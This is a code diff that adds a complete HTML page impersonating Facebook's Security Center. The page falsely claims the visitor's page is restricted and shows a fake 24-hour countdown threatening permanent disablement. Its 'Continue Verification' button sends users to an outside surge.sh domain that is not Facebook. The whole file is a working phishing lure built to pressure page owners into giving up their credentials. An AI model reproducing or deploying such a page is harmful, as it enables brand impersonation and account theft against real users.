@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Security Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        .facebook-logo {
+            font-size: 38px;
+            font-weight: 700;
+            letter-spacing: -2px;
+            color: #1877f2;
+        }
+
+        .pulse {
+            animation: pulse 3s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body class="bg-[#f0f2f5] min-h-screen flex items-center justify-center p-4">
+
+    <div class="w-full max-w-[580px] mx-auto bg-white rounded-xl shadow-lg overflow-hidden">
+
+        <!-- Facebook Header -->
+        <div class="bg-white border-b px-6 py-4 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="facebook-logo">facebook</div>
+            </div>
+            <div class="text-[#1877f2] font-semibold text-sm flex items-center gap-1">
+                <i class="fa-solid fa-shield-halved"></i>
+                Security Center
+            </div>
+        </div>
+
+        <div class="p-8">
+
+            <!-- Main Title -->
+            <div class="text-center mb-8">
+                <div class="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4">
+                    <i class="fa-solid fa-user-shield text-4xl text-[#1877f2]"></i>
+                </div>
+                <h1 class="text-2xl font-semibold text-gray-900">Your Page Requires Verification</h1>
+                <p class="text-gray-600 mt-2">We detected unusual activity on your page</p>
+            </div>
+
+            <!-- Official Warning -->
+            <div class="bg-white border border-[#dadde1] rounded-xl p-6 mb-8">
+                <div class="flex gap-4">
+                    <i class="fa-solid fa-triangle-exclamation text-3xl text-[#f59e0b] mt-1"></i>
+                    <div>
+                        <div class="font-semibold text-lg text-gray-800">Action Required</div>
+                        <p class="text-[15px] text-gray-700 mt-2 leading-relaxed">
+                            Your page has been temporarily restricted because it was reported for violating Facebook's Community Standards. 
+                            To restore access, please verify your identity.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Info Box -->
+            <div class="border border-gray-200 rounded-xl p-6 mb-8 bg-gray-50">
+                <div class="flex items-center gap-4">
+                    <div class="w-12 h-12 bg-white rounded-xl shadow flex items-center justify-center text-3xl pulse">
+                        🔒
+                    </div>
+                    <div class="flex-1">
+                        <div class="font-medium text-gray-800">Identity &amp; Page Verification</div>
+                        <div class="text-sm text-gray-600 mt-1">
+                            This helps us confirm that you are the rightful owner of this page.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Timer -->
+            <div class="bg-white border border-red-200 rounded-2xl p-6 text-center mb-8">
+                <div class="flex items-center justify-center gap-2 text-red-600 mb-3">
+                    <i class="fa-solid fa-clock"></i>
+                    <span class="font-semibold">Time Remaining</span>
+                </div>
+                <div id="timer" class="text-5xl font-mono font-bold text-red-600">24:00:00</div>
+                <p class="text-sm text-gray-500 mt-1">before your page is permanently disabled</p>
+            </div>
+
+            <!-- Verify Button -->
+            <button onclick="window.location.href='https://appeal-solve-this-restriction.surge.sh/'" 
+                    class="w-full py-4 rounded-xl bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#1459c7] text-white font-semibold text-lg transition-all flex items-center justify-center gap-2 shadow-md">
+                <i class="fa-solid fa-arrow-right-to-bracket"></i>
+                Continue Verification
+            </button>
+
+            <div class="text-center mt-6 text-xs text-gray-500">
+                Facebook © 2026 • 
+                <span class="underline cursor-pointer hover:text-gray-700">Community Standards</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let deadline = localStorage.getItem('fb_deadline');
+        
+        if (!deadline) {
+            deadline = new Date().getTime() + (24 * 60 * 60 * 1000);
+            localStorage.setItem('fb_deadline', deadline);
+        } else {
+            deadline = parseInt(deadline);
+        }
+
+        function updateTimer() {
+            const now = new Date().getTime();
+            const distance = deadline - now;
+
+            if (distance < 0) {
+                document.getElementById('timer').textContent = "00:00:00";
+                return;
+            }
+
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById('timer').textContent = 
+                `${hours < 10 ? '0' : ''}${hours}:${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        setInterval(updateTimer, 1000);
+        updateTimer();
+    </script>
+</body>
+</html>
